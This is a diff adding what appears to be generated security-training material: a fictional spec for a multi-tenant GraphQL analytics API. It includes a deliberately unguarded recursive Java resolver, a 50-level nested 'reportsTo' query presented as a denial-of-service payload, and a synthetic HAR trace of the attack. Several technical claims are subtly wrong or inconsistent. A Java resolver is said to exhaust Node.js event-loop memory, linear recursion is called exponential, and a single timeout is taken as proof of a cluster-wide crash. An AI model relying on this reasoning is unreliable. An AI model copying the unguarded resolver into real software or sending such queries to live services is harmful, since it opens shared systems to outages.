@@ -1,0 +1,203 @@
+Here is the thirty-second system, continuing the focus on GraphQL-specific vulnerabilities. We are entering the **SaaS / Reporting & Analytics** sector, focusing on a **User Relationship & Data Analytics GraphQL API**.
+
+For the vulnerabilities, we are focusing on **Pattern 9.1 (GraphQL Deep Query / Complexity DoS)** combined with **Pattern 8.4 (Resource exhaustion / Denial of Service)**. This scenario demonstrates how an attacker exploits the absence of a maximum query depth limit in the GraphQL engine by submitting a recursive query, causing a high-CPU resolver to execute until it exhausts the application server's memory and CPU resources, leading to a Denial of Service (DoS) for all tenants.
+
+***
+
+# ENGINEERING ARCHITECTURE SPECIFICATION
+**System Name:** InsightGraph Analytics API
+**Document Version:** 5.0.0 (FINAL)
+**Classification:** INTERNAL & B2B CONFIDENTIAL / OPERATIONAL SCOPE
+**Domain:** SaaS / Data Analytics / Reporting / User Graph
+
+## 1.0 Executive Summary
+InsightGraph is a multi-tenant platform used by enterprises to analyze the interconnectedness of their internal users and resources (e.g., "Find the manager of a user's manager's manager"). The platform exposes a GraphQL API to enable highly customized, nested data retrieval that is difficult to achieve with traditional REST endpoints.
+
+The core security requirement is DoS prevention. Complex, deep queries must be computationally limited, either by bounding the maximum query depth or by pre-calculating the computational complexity score of the query document before execution. The platform is currently configured to enforce neither.
+
+## 2.0 Comprehensive Network Topology & GraphQL Processing
+The architecture relies on high-performance, synchronous data processing which makes it acutely vulnerable to recursive queries.
+
+### 2.1 The Ingress Layer & GraphQL Router
+* **API Gateway (Node.js):** Handles all traffic routing to the single `/graphql` path.
+* **GraphQL-Yoga Server:** The central hub that executes the query plan.
+
+### 2.2 The Backend Core Services
+* **Analytics Service (Java/Spring):** The resolver logic. The `relationships` field is computed synchronously by walking a Neo4j-style graph database, and this operation is highly CPU-intensive, involving multiple database roundtrips for each level of recursion.
+
+## 3.0 Identity, Sessions, and Authorization
+Security relies on tenant-scoped JWTs, but the flaw is purely architectural and relates to availability, not data leakage.
+
+### 3.1 User Authentication (JWT)
+Users authenticate via corporate SSO, and their session JWT contains the `user_id` and `tenant_id`.
+
+### 3.2 The Flaw: Missing Query Complexity Defense
+The GraphQL-Yoga server was deployed without a complexity analyzer plugin or a maximum query depth enforcement rule. The default depth limit is typically 50, but in this specific architecture, the Java resolver for `User.reportsTo` recursively calls itself until the Node.js event loop runs out of available memory or the HTTP timeout is hit.
+
+## 4.0 Known System Debt & Theoretical Attack Surfaces
+*Internal Security Engineering Note: The Java `relationships` resolver was initially designed for a maximum recursion of 3 levels. We explicitly removed the recursion limit during feature expansion (Epic: ANALYTICS-501) and relied on the client-side UI to enforce a limit of 5. Tracked as RISK-GRPH-804.*
+
+### 4.1 Vulnerability A: GraphQL Deep Query Recursive DoS (Resource Exhaustion)
+**Taxonomy Pattern:** 9.1 (GraphQL Operations / Deep Query) & 8.4 (Resource exhaustion)
+**Sub-system:** Analytics Service Resolver (`Query: user` and `User.reportsTo`)
+
+**The Deep Architectural Flaw:**
+This attack leverages GraphQL's structural strength (deep queries) as a resource exhaustion vulnerability.
+
+1. **Deep Query / Recursive Execution (Pattern 9.1):** The attacker crafts a query that requests a recursive field (e.g., `user { reportsTo { reportsTo { reportsTo { ... } } } }`) nested 50 times deep.
+
+2. **Resource Exhaustion (Pattern 8.4):** The GraphQL engine executes the query. The Java resolver for `reportsTo` is called 50 times for a single user record. Each execution triggers a database roundtrip and high-CPU object mapping. This synchronous, exponential execution blocks the main application thread for several seconds, consuming massive amounts of temporary memory (to hold the deeply nested JSON structure) and starving the server of resources needed to respond to other users.
+
+**The Exploitation Path:**
+
+1. **The Setup:** An attacker (User A) is authenticated and uses a tool (like GraphiQL) to test the depth limit.
+2. **The Recursive Query:** The attacker crafts a query that nests the `reportsTo` field 50 times, targeting a benign field like `id` at the end of each level.
+3. **The Execution:** The single HTTP POST request is accepted. The backend begins the recursive resolution. After the 20th level, the server's CPU spikes to 100%. After the 50th level is processed, the memory consumed by the resultant JSON object (even with minimal fields) exceeds the Node.js cluster's memory limit.
+4. **The Impact:** The GraphQL server crashes or becomes unresponsive. The single HTTP request causes a DoS for all users within the entire multi-tenant cluster.
+
+***
+
+# INSIGHTGRAPH API: SCHEMAS, VULNERABLE CODE, & GRAPHQL CONTRACTS
+**Document Version:** 4.1.0
+**Applies to Architecture:** InsightGraph Analytics API v5.0.0
+
+## 5.0 User Graph Schema (Neo4j Equivalent)
+The graph database structure allows for infinite traversal, necessitating application-layer depth limits.
+
+```cypher
+// Node Definitions
+(:User { id: String!, tenant_id: String!, displayName: String! })
+
+// Relationship Definitions
+(:User) -[:REPORTS_TO]-> (:User)
+```
+
+## 6.0 The Flawed Implementation (Java / Spring Boot Resolver)
+The resolver for the recursive field lacks a guard clause to limit how many times it can be called within a single query execution path.
+
+### 6.1 Vulnerable Recursive Resolver
+```java
+// File: resolvers/userRelations.java
+
+@Component
+public class UserRelationsResolver implements GraphQLResolver<User> {
+// User.reportsTo: Recursively finds the user's manager
+public User reportsTo(User subordinate, DataFetchingEnvironment env) {
+    // VULNERABILITY 9.1 & 8.4: Missing Depth/Complexity Limit
+    // This resolver is called for every nested 'reportsTo' field in the GraphQL query.
+    // The code FAILS to use context to check if env.getSelectionSet().getSelectionSet().size() 
+    // or a custom depth counter is exceeded.
+    
+    String managerId = db.findManagerIdByUserId(subordinate.getId());
+    
+    if (managerId == null) {
+        return null; // Stops recursion only if no manager exists
+    }
+
+    // High-cost synchronous DB fetch/mapping is executed on every recursive call
+    return db.fetchUserById(managerId); 
+}
+}
+```
+
+## 7.0 GraphQL API Contract (The Deep Query DoS)
+The attacker crafts a single query that maximizes the recursive depth, exploiting the architectural failure to limit computation.
+
+### 7.1 Execute Recursive Deep Query
+**Endpoint:** `POST /graphql`
+**Description:** Submits a query with 50 levels of recursion on the `reportsTo` field.
+
+**Required Headers:**
+```http
+Authorization: Bearer <Attacker_User_JWT>
+Content-Type: application/json
+```
+
+**Malicious Request Payload (Truncated):**
+```graphql
+query RecursiveDoS {
+user(id: "usr-88192A") {
+id
+reportsTo { # Level 1
+id
+reportsTo { # Level 2
+id
+# ... 46 levels omitted for brevity ...
+reportsTo { # Level 49
+id
+reportsTo { # Level 50
+displayName
+}
+}
+}
+}
+}
+}
+```
+
+**Response (504 Timeout - DoS Confirmed):**
+The server fails to respond before the API Gateway's hard timeout limit (e.g., 30 seconds).
+```http
+HTTP/2 504 Gateway Timeout
+```
+
+***
+
+# SYNTHETIC ARTIFACT: GRAPHQL RECURSIVE DOS (HAR TRACE)
+**Applies to Architecture:** InsightGraph Analytics API v5.0.0
+**Vulnerabilities Referenced:** Section 4.1 (Pattern 9.1 & Pattern 8.4)
+
+This HTTP Archive (HAR) trace captures the moment the GraphQL deep query DoS attack is executed. The attacker sends a single HTTP POST request containing a query that nests the `reportsTo` field 50 times.
+
+The single request is accepted, but the synchronous recursive execution starves the Node.js/Java cluster of CPU and memory. The request remains open for 30 seconds until the upstream load balancer terminates the connection due to timeout, returning a `504 Gateway Timeout` to the client. This response confirms the resource exhaustion attack, as the query successfully blocked the thread and crashed the server for all concurrent users.
+
+```json
+{
+"log": {
+"version": "1.2",
+"creator": {
+"name": "Node.js API Gateway / Load Balancer Logs",
+"version": "5.0.0"
+},
+"entries": [
+{
+"startedDateTime": "2026-04-10 T12:45:10.055Z",
+"time": 30005,
+"request": {
+"method": "POST",
+"url": "https://api.insightgraph.com/graphql",
+"httpVersion": "HTTP/2.0",
+"headers": [
+{ "name": ":authority", "value": "api.insightgraph.com" },
+{ "name": "authorization", "value": "Bearer JWT_ATTACKER_88192A..." },
+{ "name": "content-type", "value": "application/json" }
+],
+"queryString": [],
+"postData": {
+"mimeType": "application/json",
+"text": "{\"query\": \"query RecursiveDoS { user(id: \\\"usr-88192A\\\") { id reportsTo { id reportsTo { id ... } } } }\"}",
+"comment": "Payload contained 50 levels of 'reportsTo' recursion."
+},
+"bodySize": 10240
+},
+"response": {
+"status": 504,
+"statusText": "Gateway Timeout",
+"headers": [
+{ "name": "content-type", "value": "application/json" },
+{ "name": "x-load-balancer-timeout", "value": "30000ms" }
+],
+"content": {
+"size": 70,
+"mimeType": "application/json",
+"text": "{\"message\": \"Gateway timed out waiting for upstream server.\"}"
+},
+"bodySize": 70
+}
+}
+]
+}
+}
+```
+
+***
